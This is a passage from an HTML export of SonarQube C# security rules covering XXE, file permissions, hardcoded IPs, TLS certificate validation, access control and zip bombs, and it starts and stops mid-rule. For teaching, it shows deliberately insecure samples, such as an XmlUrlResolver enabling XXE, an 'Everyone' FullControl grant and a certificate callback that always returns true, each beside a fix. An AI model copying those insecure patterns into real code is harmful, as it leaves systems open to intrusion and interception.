            log4net.Config.XmlConfigurator.Configure(repository, element); // Sensitive
            log4net.Config.XmlConfigurator.Configure(repository, configFile); // Sensitive
            log4net.Config.XmlConfigurator.Configure(repository, configUri); // Sensitive
            log4net.Config.XmlConfigurator.Configure(repository, configStream); // Sensitive
            log4net.Config.XmlConfigurator.ConfigureAndWatch(repository, configFile); // Sensitive

            log4net.Config.DOMConfigurator.Configure(); // Sensitive
            log4net.Config.DOMConfigurator.Configure(repository); // Sensitive
            log4net.Config.DOMConfigurator.Configure(element); // Sensitive
            log4net.Config.DOMConfigurator.Configure(repository, element); // Sensitive
            log4net.Config.DOMConfigurator.Configure(configFile); // Sensitive
            log4net.Config.DOMConfigurator.Configure(repository, configFile); // Sensitive
            log4net.Config.DOMConfigurator.Configure(configStream); // Sensitive
            log4net.Config.DOMConfigurator.Configure(repository, configStream); // Sensitive
            log4net.Config.DOMConfigurator.ConfigureAndWatch(configFile); // Sensitive
            log4net.Config.DOMConfigurator.ConfigureAndWatch(repository, configFile); // Sensitive

            log4net.Config.BasicConfigurator.Configure(); // Sensitive
            log4net.Config.BasicConfigurator.Configure(appender); // Sensitive
            log4net.Config.BasicConfigurator.Configure(appenders); // Sensitive
            log4net.Config.BasicConfigurator.Configure(repository); // Sensitive
            log4net.Config.BasicConfigurator.Configure(repository, appender); // Sensitive
            log4net.Config.BasicConfigurator.Configure(repository, appenders); // Sensitive
        }
    }
}
</pre>
<p><strong>NLog</strong>: configure programmatically</p>
<pre>
namespace Logging
{
    class NLogLogging
    {
        void Foo(NLog.Config.LoggingConfiguration config) {
            NLog.LogManager.Configuration &#61; config; // Sensitive, this changes the logging configuration.
        }
    }
}
</pre>
<p><strong>Serilog</strong></p>
<pre>
namespace Logging
{
    class SerilogLogging
    {
        void Foo() {
            new Serilog.LoggerConfiguration(); // Sensitive
        }
    }
}
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A09_2021-Security_Logging_and_Monitoring_Failures/" rel="nofollow">OWASP Top 10 2021 Category A9</a> - Security Logging and
  Monitoring Failures </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A10_2017-Insufficient_Logging%2526Monitoring" rel="nofollow">OWASP Top 10 2017 Category A10</a> -
  Insufficient Logging &amp; Monitoring </li><li> <a href="https://cwe.mitre.org/data/definitions/117" rel="nofollow">MITRE, CWE-117</a> - Improper Output Neutralization for Logs </li><li> <a href="https://cwe.mitre.org/data/definitions/532" rel="nofollow">MITRE, CWE-532</a> - Information Exposure Through Log Files </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=csharpsquid:S2755">
              csharpsquid:S2755
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability allows the usage of external entities in XML.</p>
<h2>Why is this an issue?</h2>
<p>External Entity Processing allows for XML parsing with the involvement of external entities. However, when this functionality is enabled without
proper precautions, it can lead to a vulnerability known as XML External Entity (XXE) attack.</p>
<h3>What is the potential impact?</h3>
<h4>Exposing sensitive data</h4>
<p>One significant danger of XXE vulnerabilities is the potential for sensitive data exposure. By crafting malicious XML payloads, attackers can
reference external entities that contain sensitive information, such as system files, database credentials, or configuration files. When these
entities are processed during XML parsing, the attacker can extract the contents and gain unauthorized access to sensitive data. This poses a severe
threat to the confidentiality of critical information.</p>
<h4>Exhausting system resources</h4>
<p>Another consequence of XXE vulnerabilities is the potential for denial-of-service attacks. By exploiting the ability to include external entities,
attackers can construct XML payloads that cause resource exhaustion. This can overwhelm the system’s memory, CPU, or other critical resources, leading
to system unresponsiveness or crashes. A successful DoS attack can disrupt the availability of services and negatively impact the user experience.</p>
<h4>Forging requests</h4>
<p>XXE vulnerabilities can also enable Server-Side Request Forgery (SSRF) attacks. By leveraging the ability to include external entities, an attacker
can make the vulnerable application send arbitrary requests to other internal or external systems. This can result in unintended actions, such as
retrieving data from internal resources, scanning internal networks, or attacking other systems. SSRF attacks can lead to severe consequences,
including unauthorized data access, system compromise, or even further exploitation within the network infrastructure.</p>
<h2>How to fix it in .NET</h2>
<h3>Code examples</h3>
<p>The following code contains examples of XML parsers that have external entity processing enabled. As a result, the parsers are vulnerable to XXE
attacks if an attacker can control the XML file that is processed.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
using System.Xml;

public static void decode()
{
    XmlDocument parser &#61; new XmlDocument();
    parser.XmlResolver &#61; new XmlUrlResolver(); // Noncompliant
    parser.LoadXml(&#34;xxe.xml&#34;);
}
</pre>
<h4>Compliant solution</h4>
<p><code>XmlDocument</code> is safe by default since .NET Framework 4.5.2. For older versions, set <code>XmlResolver</code> explicitly to
<code>null</code>.</p>
<pre data-diff-id="1" data-diff-type="compliant">
using System.Xml;

public static void decode()
{
    XmlDocument parser &#61; new XmlDocument();
    parser.XmlResolver &#61; null;
    parser.LoadXml(&#34;xxe.xml&#34;);
}
</pre>
<h3>How does this work?</h3>
<h4>Disable external entities</h4>
<p>The most effective approach to prevent XXE vulnerabilities is to disable external entity processing entirely, unless it is explicitly required for
specific use cases. By default, XML parsers should be configured to reject the processing of external entities. This can be achieved by setting the
appropriate properties or options in your XML parser library or framework.</p>
<p>If external entity processing is necessary for certain scenarios, adopt a whitelisting approach to restrict the entities that can be resolved
during XML parsing. Create a list of trusted external entities and disallow all others. This approach ensures that only known and safe entities are
processed.<br /> You should rely on features provided by your XML parser to restrict the external entities.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A4_2017-XML_External_Entities_%28XXE%29" rel="nofollow">OWASP Top 10 2017 Category A4</a> - XML External
  Entities (XXE) </li><li> <a href="https://cwe.mitre.org/data/definitions/611" rel="nofollow">MITRE, CWE-611</a> - Information Exposure Through XML External Entity Reference </li><li> <a href="https://cwe.mitre.org/data/definitions/827" rel="nofollow">MITRE, CWE-827</a> - Improper Control of Document Type Definition </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=csharpsquid:S2612">
              csharpsquid:S2612
            </a>
          </td>
          <td>
            <details>
              <p>In Unix, &#34;others&#34; class refers to all users except the owner of the file and the members of the group assigned to this file.</p>
<p>In Windows, &#34;Everyone&#34; group is similar and includes all members of the Authenticated Users group as well as the built-in Guest account, and
several other built-in security accounts.</p>
<p>Granting permissions to these groups can lead to unintended access to files.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The application is designed to be run on a multi-user environment. </li><li> Corresponding files and directories may contain confidential information. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>The most restrictive possible permissions should be assigned to files and directories.</p>
<h2>Sensitive Code Example</h2>
<p>.Net Framework:</p>
<pre>
var unsafeAccessRule &#61; new FileSystemAccessRule(&#34;Everyone&#34;, FileSystemRights.FullControl, AccessControlType.Allow);

var fileSecurity &#61; File.GetAccessControl(&#34;path&#34;);
fileSecurity.AddAccessRule(unsafeAccessRule); // Sensitive
fileSecurity.SetAccessRule(unsafeAccessRule); // Sensitive
File.SetAccessControl(&#34;fileName&#34;, fileSecurity);
</pre>
<p>.Net / .Net Core</p>
<pre>
var fileInfo &#61; new FileInfo(&#34;path&#34;);
var fileSecurity &#61; fileInfo.GetAccessControl();

fileSecurity.AddAccessRule(new FileSystemAccessRule(&#34;Everyone&#34;, FileSystemRights.Write, AccessControlType.Allow)); // Sensitive
fileInfo.SetAccessControl(fileSecurity);
</pre>
<p>.Net / .Net Core using Mono.Posix.NETStandard</p>
<pre>
var fileSystemEntry &#61; UnixFileSystemInfo.GetFileSystemEntry(&#34;path&#34;);
fileSystemEntry.FileAccessPermissions &#61; FileAccessPermissions.OtherReadWriteExecute; // Sensitive
</pre>
<h2>Compliant Solution</h2>
<p>.Net Framework</p>
<pre>
var safeAccessRule &#61; new FileSystemAccessRule(&#34;Everyone&#34;, FileSystemRights.FullControl, AccessControlType.Deny);

var fileSecurity &#61; File.GetAccessControl(&#34;path&#34;);
fileSecurity.AddAccessRule(safeAccessRule);
File.SetAccessControl(&#34;path&#34;, fileSecurity);
</pre>
<p>.Net / .Net Core</p>
<pre>
var safeAccessRule &#61; new FileSystemAccessRule(&#34;Everyone&#34;, FileSystemRights.FullControl, AccessControlType.Deny);

var fileInfo &#61; new FileInfo(&#34;path&#34;);
var fileSecurity &#61; fileInfo.GetAccessControl();
fileSecurity.SetAccessRule(safeAccessRule);
fileInfo.SetAccessControl(fileSecurity);
</pre>
<p>.Net / .Net Core using Mono.Posix.NETStandard</p>
<pre>
var fs &#61; UnixFileSystemInfo.GetFileSystemEntry(&#34;path&#34;);
fs.FileAccessPermissions &#61; FileAccessPermissions.UserExecute;
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/" rel="nofollow">OWASP Top 10 2021 Category A4</a> - Insecure Design </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control" rel="nofollow">OWASP Top 10 2017 Category A5</a> - Broken Access Control
  </li><li> <a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/09-Test_File_Permission" rel="nofollow">OWASP File Permission</a> </li><li> <a href="https://cwe.mitre.org/data/definitions/732" rel="nofollow">MITRE, CWE-732</a> - Incorrect Permission Assignment for Critical Resource </li><li> <a href="https://cwe.mitre.org/data/definitions/266" rel="nofollow">MITRE, CWE-266</a> - Incorrect Privilege Assignment </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=csharpsquid:S1313">
              csharpsquid:S1313
            </a>
          </td>
          <td>
            <details>
              <p>Hardcoding IP addresses is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2006-5901" rel="nofollow">CVE-2006-5901</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2005-3725" rel="nofollow">CVE-2005-3725</a> </li></ul>
<p>Today’s services have an ever-changing architecture due to their scaling and redundancy needs. It is a mistake to think that a service will always
have the same IP address. When it does change, the hardcoded IP will have to be modified too. This will have an impact on the product development,
delivery, and deployment:</p>
<ul><li> The developers will have to do a rapid fix every time this happens, instead of having an operation team change a configuration file. </li><li> It misleads to use the same address in every environment (dev, sys, qa, prod). </li></ul>
<p>Last but not least it has an effect on application security. Attackers might be able to decompile the code and thereby discover a potentially
sensitive address. They can perform a Denial of Service attack on the service, try to get access to the system, or try to spoof the IP address to
bypass security checks. Such attacks can always be possible, but in the case of a hardcoded IP address solving the issue will take more time, which
will increase an attack’s impact.</p>
<h2>Ask Yourself Whether</h2>
<p>The disclosed IP address is sensitive, e.g.:</p>
<ul><li> Can give information to an attacker about the network topology. </li><li> It’s a personal (assigned to an identifiable person) IP address. </li></ul>
<p>There is a risk if you answered yes to any of these questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Don’t hard-code the IP address in the source code, instead make it configurable with environment variables, configuration files, or a similar
approach. Alternatively, if confidentially is not required a domain name can be used since it allows to change the destination quickly without having
to rebuild the software.</p>
<h2>Sensitive Code Example</h2>
<pre>
var ip &#61; &#34;192.168.12.42&#34;;
var address &#61; IPAddress.Parse(ip);
</pre>
<h2>Compliant Solution</h2>
<pre>
var ip &#61; ConfigurationManager.AppSettings[&#34;myapplication.ip&#34;];
var address &#61; IPAddress.Parse(ip);
</pre>
<h2>Exceptions</h2>
<p>No issue is reported for the following cases because they are not considered sensitive:</p>
<ul><li> Loopback addresses 127.0.0.0/8 in CIDR notation (from 127.0.0.0 to 127.255.255.255) </li><li> Broadcast address 255.255.255.255 </li><li> Non-routable address 0.0.0.0 </li><li> Strings of the form <code>2.5.&lt;number&gt;.&lt;number&gt;</code> as they <a href="http://www.oid-info.com/introduction.htm" rel="nofollow">often match
  Object Identifiers</a> (OID) </li><li> Addresses in the ranges 192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24, reserved for documentation purposes by <a href="https://datatracker.ietf.org/doc/html/rfc5737" rel="nofollow">RFC 5737</a> </li><li> Addresses in the range 2001:db8::/32, reserved for documentation purposes by <a href="https://datatracker.ietf.org/doc/html/rfc3849" rel="nofollow">RFC
  3849</a> </li></ul>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=csharpsquid:S4829">
              csharpsquid:S4829
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated, and will eventually be removed.</p>
<p>Reading Standard Input is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2005-2337" rel="nofollow">CVE-2005-2337</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2017-11449" rel="nofollow">CVE-2017-11449</a> </li></ul>
<p>It is common for attackers to craft inputs enabling them to exploit software vulnerabilities. Thus any data read from the standard input (stdin)
can be dangerous and should be validated.</p>
<p>This rule flags code that reads from the standard input.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> data read from the standard input is not sanitized before being used. </li></ul>
<p>You are at risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p><a href="https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet" rel="nofollow">Sanitize</a> all data read from the standard input before using it.</p>
<h2>Sensitive Code Example</h2>
<pre>
using System;
public class C
{
    public void Main()
    {
        Console.In; // Sensitive
        var code &#61; Console.Read(); // Sensitive
        var keyInfo &#61; Console.ReadKey(...); // Sensitive
        var text &#61; Console.ReadLine(); // Sensitive
        Console.OpenStandardInput(...); // Sensitive
    }
}
</pre>
<h2>Exceptions</h2>
<p>This rule does not raise issues when the return value of the <code>Console.Read</code> <code>Console.ReadKey</code> or
<code>Console.ReadLine</code> methods is ignored.</p>
<pre>
using System;
public class C
{
    public void Main()
    {
        Console.ReadKey(...); // Return value is ignored
        Console.ReadLine(); // Return value is ignored
    }
}
</pre>
<h2>See</h2>
<ul><li> <a href="https://cwe.mitre.org/data/definitions/20" rel="nofollow">MITRE, CWE-20</a> - Improper Input Validation </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=csharpsquid:S4823">
              csharpsquid:S4823
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated, and will eventually be removed.</p>
<p>Using command line arguments is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2018-7281" rel="nofollow">CVE-2018-7281</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2018-12326" rel="nofollow">CVE-2018-12326</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2011-3198" rel="nofollow">CVE-2011-3198</a> </li></ul>
<p>Command line arguments can be dangerous just like any other user input. They should never be used without being first validated and sanitized.</p>
<p>Remember also that any user can retrieve the list of processes running on a system, which makes the arguments provided to them visible. Thus
passing sensitive information via command line arguments should be considered as insecure.</p>
<p>This rule raises an issue when on every program entry points (<code>main</code> methods) when command line arguments are used. The goal is to guide
security code reviews.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> any of the command line arguments are used without being sanitized first. </li><li> your application accepts sensitive information via command line arguments. </li></ul>
<p>If you answered yes to any of these questions you are at risk.</p>
<h2>Recommended Secure Coding Practices</h2>
<p><a href="https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet" rel="nofollow">Sanitize</a> all command line arguments before using them.</p>
<p>Any user or application can list running processes and see the command line arguments they were started with. There are safer ways of providing
sensitive information to an application than exposing them in the command line. It is common to write them on the process&#39; standard input, or give the
path to a file containing the information.</p>
<h2>Sensitive Code Example</h2>
<pre>
namespace MyNamespace
{
    class Program
    {
        static void Main(string[] args) // Sensitive if there is a reference to &#34;args&#34; in the method.
        {
            string myarg &#61; args[0];
            // ...
        }
    }
}
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li><li> <a href="https://cwe.mitre.org/data/definitions/88" rel="nofollow">MITRE, CWE-88</a> - Argument Injection or Modification </li><li> <a href="https://cwe.mitre.org/data/definitions/214" rel="nofollow">MITRE, CWE-214</a> - Information Exposure Through Process Environment </li><li> <a href="https://www.sans.org/top25-software-errors/#cat1" rel="nofollow">SANS Top 25</a> - Insecure Interaction Between Components </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=csharpsquid:S4830">
              csharpsquid:S4830
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability makes it possible that an encrypted communication is intercepted.</p>
<h2>Why is this an issue?</h2>
<p>Transport Layer Security (TLS) provides secure communication between systems over the internet by encrypting the data sent between them. The role
of certificate validation in this process is to ensure that a system is indeed the one it claims to be, adding an extra layer of trust and
security.</p>
<p>When certificate validation is disabled, the client skips this critical check. This creates an opportunity for attackers to pose as a trusted
entity and intercept, manipulate, or steal the data being transmitted.</p>
<h3>What is the potential impact?</h3>
<p>Establishing trust in a secure way is a non-trivial task. When you disable certificate validation, you are removing a key mechanism designed to
build this trust in internet communication, opening your system up to a number of potential threats.</p>
<h4>Identity spoofing</h4>
<p>If a system does not validate certificates, it cannot confirm the identity of the other party involved in the communication. An attacker can
exploit this by creating a fake server and masquerading it as a legitimate one. For example, they might set up a server that looks like your bank’s
server, tricking your system into thinking it is communicating with the bank. This scenario, called identity spoofing, allows the attacker to collect
any data your system sends to them, potentially leading to significant data breaches.</p>
<h4>Loss of data integrity</h4>
<p>When TLS certificate validation is disabled, the integrity of the data you send and receive cannot be guaranteed. An attacker could modify the data
in transit, and you would have no way of knowing. This could range from subtle manipulations of the data you receive to the injection of malicious
code or malware into your system. The consequences of such breaches of data integrity can be severe, depending on the nature of the data and the
system.</p>
<h2>How to fix it in .NET</h2>
<h3>Code examples</h3>
<p>In the following example, the callback change impacts the entirety of HTTP requests made by the application.</p>
<p>The certificate validation gets disabled by overriding <code>ServerCertificateValidationCallback</code> with an empty implementation. It is highly
recommended to use the original implementation.</p>
<h4>Noncompliant code example</h4>
<pre>
using System.Net;
using System.Net.Http;

public static void connect()
{
    ServicePointManager.ServerCertificateValidationCallback &#43;&#61;
	 (sender, certificate, chain, errors) &#61;&gt; {
	     return true; // Noncompliant
    };

    HttpClient httpClient &#61; new HttpClient();
    HttpResponseMessage response &#61; httpClient.GetAsync(&#34;https://example.com&#34;).Result;
}
</pre>
<h3>How does this work?</h3>
<p>Addressing the vulnerability of disabled TLS certificate validation primarily involves re-enabling the default validation.</p>
<p>To avoid running into problems with invalid certificates, consider the following sections.</p>
<h4>Using trusted certificates</h4>
<p>If possible, always use a certificate issued by a well-known, trusted CA for your server. Most programming environments come with a predefined list
of trusted root CAs, and certificates issued by these authorities are validated automatically. This is the best practice, and it requires no
additional code or configuration.</p>
<h4>Working with self-signed certificates or non-standard CAs</h4>
<p>In some cases, you might need to work with a server using a self-signed certificate, or a certificate issued by a CA not included in your trusted
roots. Rather than disabling certificate validation in your code, you can add the necessary certificates to your trust store.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/" rel="nofollow">OWASP Top 10 2021 Category A7</a> - Identification and
  Authentication Failures </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m3-insecure-communication" rel="nofollow">OWASP Mobile Top 10 2016 Category M3</a> - Insecure
  Communication </li><li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x10-v5-network_communication_requirements" rel="nofollow">Mobile AppSec Verification
  Standard</a> - Network Communication Requirements </li><li> <a href="https://cwe.mitre.org/data/definitions/295" rel="nofollow">MITRE, CWE-295</a> - Improper Certificate Validation </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=csharpsquid:S4834">
              csharpsquid:S4834
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated, and will eventually be removed.</p>
<p>The access control of an application must be properly implemented in order to restrict access to resources to authorized entities otherwise this
could lead to vulnerabilities:</p>
<ul><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2018-12999" rel="nofollow">CVE-2018-12999</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2018-10285" rel="nofollow">CVE-2018-10285</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2017-7455" rel="nofollow">CVE-2017-7455</a> </li></ul>
<p>Granting correct permissions to users, applications, groups or roles and defining required permissions that allow access to a resource is
sensitive, must therefore be done with care. For instance, it is obvious that only users with administrator privilege should be authorized to
add/remove the administrator permission of another user.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> Granted permission to an entity (user, application) allow access to information or functionalities not needed by this entity. </li><li> Privileges are easily acquired (eg: based on the location of the user, type of device used, defined by third parties, does not require approval
  …​). </li><li> Inherited permission, default permission, no privileges (eg: anonymous user) is authorized to access to a protected resource. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>At minimum, an access control system should:</p>
<ul><li> Use a well-defined access control model like <a href="https://en.wikipedia.org/wiki/Role-based_access_control" rel="nofollow">RBAC</a> or <a href="https://en.wikipedia.org/wiki/Access-control_list" rel="nofollow">ACL</a>. </li><li> Entities&#39; permissions should be reviewed regularly to remove permissions that are no longer needed. </li><li> Respect <a href="https://en.wikipedia.org/wiki/Principle_of_least_privilege" rel="nofollow">the principle of least privilege</a> (&#34;<em>an entity has access
  only the information and resources that are necessary for its legitimate purpose</em>&#34;). </li></ul>
<h2>Sensitive Code Example</h2>
<pre>
using System.Threading;
using System.Security.Permissions;
using System.Security.Principal;
using System.IdentityModel.Tokens;

class SecurityPrincipalDemo
{
    class MyIdentity : IIdentity // Sensitive, custom IIdentity implementations should be reviewed
    {
        // ...
    }

    class MyPrincipal : IPrincipal // Sensitive, custom IPrincipal implementations should be reviewed
    {
        // ...
    }
    [System.Security.Permissions.PrincipalPermission(SecurityAction.Demand, Role &#61; &#34;Administrators&#34;)] // Sensitive. The access restrictions enforced by this attribute should be reviewed.
    static void CheckAdministrator()
    {
        WindowsIdentity MyIdentity &#61; WindowsIdentity.GetCurrent(); // Sensitive
        HttpContext.User &#61; ...; // Sensitive: review all reference (set and get) to System.Web HttpContext.User
        AppDomain domain &#61; AppDomain.CurrentDomain;
        domain.SetPrincipalPolicy(PrincipalPolicy.WindowsPrincipal); // Sensitive
        MyIdentity identity &#61; new MyIdentity(); // Sensitive
        MyPrincipal MyPrincipal &#61; new MyPrincipal(MyIdentity); // Sensitive
        Thread.CurrentPrincipal &#61; MyPrincipal; // Sensitive
        domain.SetThreadPrincipal(MyPrincipal); // Sensitive

        // All instantiation of PrincipalPermission should be reviewed.
        PrincipalPermission principalPerm &#61; new PrincipalPermission(null, &#34;Administrators&#34;); // Sensitive
        principalPerm.Demand();

        SecurityTokenHandler handler &#61; ...;
        // Sensitive: this creates an identity.
        ReadOnlyCollection&lt;ClaimsIdentity&gt; identities &#61; handler.ValidateToken(…);
    }

     // Sensitive: review how this function uses the identity and principal.
    void modifyPrincipal(MyIdentity identity, MyPrincipal principal)
    {
        // ...
    }
}
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control" rel="nofollow">OWASP Top 10 2017 Category A5</a> - Broken Access Control
  </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li><li> <a href="https://cwe.mitre.org/data/definitions/276" rel="nofollow">MITRE, CWE-276</a> - Incorrect Default Permissions </li><li> <a href="https://cwe.mitre.org/data/definitions/732" rel="nofollow">MITRE, CWE-732</a> - Incorrect Permission Assignment for Critical Resource </li><li> <a href="https://cwe.mitre.org/data/definitions/668" rel="nofollow">MITRE, CWE-668</a> - Exposure of Resource to Wrong Sphere </li><li> <a href="https://cwe.mitre.org/data/definitions/277" rel="nofollow">MITRE, CWE-277</a> - Insecure Inherited Permissions </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=csharpsquid:S5042">
              csharpsquid:S5042
            </a>
          </td>
          <td>
            <details>
              <p>Successful Zip Bomb attacks occur when an application expands untrusted archive files without controlling the size of the expanded data, which can
lead to denial of service. A Zip bomb is usually a malicious archive file of a few kilobytes of compressed data but turned into gigabytes of
uncompressed data. To achieve this extreme <a href="https://en.wikipedia.org/wiki/Data_compression_ratio" rel="nofollow">compression ratio</a>, attackers will
compress irrelevant data (eg: a long string of repeated bytes).</p>
<h2>Ask Yourself Whether</h2>
<p>Archives to expand are untrusted and:</p>
<ul><li> There is no validation of the number of entries in the archive. </li><li> There is no validation of the total size of the uncompressed data. </li><li> There is no validation of the ratio between the compressed and uncompressed archive entry. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Define and control the ratio between compressed and uncompressed data, in general the data compression ratio for most of the legit archives is
  1 to 3. </li><li> Define and control the threshold for maximum total size of the uncompressed data. </li><li> Count the number of file entries extracted from the archive and abort the extraction if their number is greater than a predefined threshold, in
  particular it’s not recommended to recursively expand archives (an entry of an archive could be also an archive). </li></ul>
<h2>Sensitive Code Example</h2>
<pre>
using var zipToOpen &#61; new FileStream(&#64;&#34;ZipBomb.zip&#34;, FileMode.Open);
using var archive &#61; new ZipArchive(zipToOpen, ZipArchiveMode.Read);
foreach (ZipArchiveEntry entry in archive.Entries)
{
  entry.ExtractToFile(&#34;./output_onlyfortesting.txt&#34;, true); // Sensitive
}
</pre>
<h2>Compliant Solution</h2>
<pre>
int THRESHOLD_ENTRIES &#61; 10000;
int THRESHOLD_SIZE &#61; 1000000000; // 1 GB
double THRESHOLD_RATIO &#61; 10;
int totalSizeArchive &#61; 0;
int totalEntryArchive &#61; 0;

using var zipToOpen &#61; new FileStream(&#64;&#34;ZipBomb.zip&#34;, FileMode.Open);
using var archive &#61; new ZipArchive(zipToOpen, ZipArchiveMode.Read);
foreach (ZipArchiveEntry entry in archive.Entries)
{
  totalEntryArchive &#43;&#43;;

  using (Stream st &#61; entry.Open())
  {
    byte[] buffer &#61; new byte[1024];
    int totalSizeEntry &#61; 0;
    int numBytesRead &#61; 0;

    do
    {
      numBytesRead &#61; st.Read(buffer, 0, 1024);
      totalSizeEntry &#43;&#61; numBytesRead;
      totalSizeArchive &#43;&#61; numBytesRead;
      double compressionRatio &#61; totalSizeEntry / entry.CompressedLength;

      if(compressionRatio &gt; THRESHOLD_RATIO) {
        // ratio between compressed and uncompressed data is highly suspicious, looks like a Zip Bomb Attack
        break;
      }
    }
    while (numBytesRead &gt; 0);
  }

  if(totalSizeArchive &gt; THRESHOLD_SIZE) {
      // the uncompressed data size is too much for the application resource capacity
      break;
  }

  if(totalEntryArchive &gt; THRESHOLD_ENTRIES) {
      // too much entries in this archive, can lead to inodes exhaustion of the system
      break;
  }
}
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A6-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> -
